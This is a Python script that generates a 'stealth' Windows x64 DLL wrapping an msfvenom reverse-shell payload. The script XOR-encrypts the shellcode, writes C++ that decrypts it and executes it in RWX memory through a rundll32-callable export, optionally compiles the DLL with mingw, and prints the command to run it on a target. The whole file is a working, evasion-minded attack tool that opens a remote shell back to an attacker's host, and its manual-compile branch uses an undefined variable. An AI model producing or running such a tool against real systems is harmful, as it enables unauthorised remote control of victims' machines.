#!/usr/bin/env python3
"""
Generate a stealth x64 wrapper DLL for a msfvenom reverse shell or not, I don't care

Usage:
  python3 generate_dll.py --lhost 10.10.15.170 --lport 4444 --compile
"""

import os, sys, hashlib, argparse, subprocess, tempfile, shutil, textwrap

def generate_shellcode(lhost: str, lport: int) -> bytes:
    if not shutil.which("msfvenom"):
        sys.exit("[-] msfvenom not found. Install Metasploit.")
    with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as tmp:
        temp_path = tmp.name
    cmd = [
        "msfvenom",
        "-p", "windows/x64/shell_reverse_tcp",
        f"LHOST={lhost}", f"LPORT={lport}",
        "-f", "raw", "-o", temp_path,
    ]
    print(f"[*] Generating shellcode: {' '.join(cmd)}")
    try:
        subprocess.run(cmd, check=True, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        os.unlink(temp_path)
        sys.exit(f"[-] msfvenom failed:\n{e.stderr}")
    with open(temp_path, "rb") as f:
        data = f.read()
    os.unlink(temp_path)
    print(f"[+] Shellcode size: {len(data)} bytes")
    return data

def derive_key(lhost: str, lport: int) -> bytes:
    return hashlib.sha256(f"{lhost}:{lport}".encode()).digest()

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def generate_wrapper_cpp(encrypted_sc: bytes, xor_key: bytes) -> str:
    sc_array = "{\n" + ",\n".join(
        ", ".join(f"0x{b:02x}" for b in encrypted_sc[i:i+16])
        for i in range(0, len(encrypted_sc), 16)
    ) + "\n};"
    key_array = "{" + ", ".join(f"0x{b:02x}" for b in xor_key) + "};"

    return textwrap.dedent(f"""\
    #include <windows.h>

    #define LOG(fmt, ...) OutputDebugStringA(fmt)

    const unsigned char encrypted_shellcode[] = {sc_array};
    const unsigned int shellcode_len = sizeof(encrypted_shellcode);
    const unsigned char xor_key[] = {key_array};
    const unsigned int key_len = sizeof(xor_key);

    DWORD WINAPI ShellcodeThread(LPVOID lpParam) {{
        unsigned char* sc = (unsigned char*)lpParam;

        for (unsigned int i = 0; i < shellcode_len; i++)
            sc[i] ^= xor_key[i % key_len];

        LPVOID exec = VirtualAlloc(nullptr, shellcode_len,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
        if (!exec) return 1;

        memcpy(exec, sc, shellcode_len);
        LOG("[*] Executing shellcode...\\n");
        ((void(*)())exec)();

        VirtualFree(exec, 0, MEM_RELEASE);
        return 0;
    }}

    extern "C" __declspec(dllexport) void CALLBACK Start(
        HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
    {{
        LPVOID mem = VirtualAlloc(nullptr, shellcode_len,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_READWRITE);
        if (!mem) return;
        memcpy(mem, encrypted_shellcode, shellcode_len);

        HANDLE hThread = CreateThread(nullptr, 0, ShellcodeThread, mem, 0, nullptr);
        if (hThread) {{
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }}

        VirtualFree(mem, 0, MEM_RELEASE);
        LOG("[*] Shell thread finished – exiting\\n");
    }}

    BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {{
        return TRUE;
    }}
    """)

def main():
    parser = argparse.ArgumentParser(description="Generate stealth x64 shellcode DLL")
    parser.add_argument("--lhost", required=True)
    parser.add_argument("--lport", required=True, type=int)
    parser.add_argument("--output-shellcode", default="encrypted_sc.bin")
    parser.add_argument("--output-source", default="wrapper.cpp")
    parser.add_argument("--output-dll", default="neverender.dll")
    parser.add_argument("--compile", action="store_true",
                        help="Compile the DLL automatically")
    args = parser.parse_args()

    sc = generate_shellcode(args.lhost, args.lport)

    key = derive_key(args.lhost, args.lport)
    print(f"[*] XOR key: {key.hex()}")
    encrypted = xor_encrypt(sc, key)
    with open(args.output_shellcode, "wb") as f:
        f.write(encrypted)
    print(f"[+] Encrypted shellcode saved to {args.output_shellcode}")

    cpp = generate_wrapper_cpp(encrypted, key)
    with open(args.output_source, "w") as f:
        f.write(cpp)
    print(f"[+] Wrapper source written to {args.output_source}")

    if args.compile:
        compiler = "x86_64-w64-mingw32-g++"
        if not shutil.which(compiler):
            sys.exit(f"[-] {compiler} not found. Install mingw-w64.")
        cmd = [
            compiler,
            "-shared", "-O2",
            "-o", args.output_dll,
            args.output_source,
            "-s", "-static",
        ]
        print(f"[*] Compiling: {' '.join(cmd)}")
        proc = subprocess.run(cmd, capture_output=True, text=True)
        if proc.returncode != 0:
            print("[-] Compilation failed. Compiler output:")
            print(proc.stderr)
            sys.exit(1)
        print(f"[+] Compiled DLL: {args.output_dll}")
        print(f"\n[+] DLL ready. Run on target: rundll32 {args.output_dll},Start")
    else:
        print(f"[*] To compile manually:")
        print(f"    {compiler} -shared -O2 -o {args.output_dll} {args.output_source} -s -static")

if __name__ == "__main__":
    main()
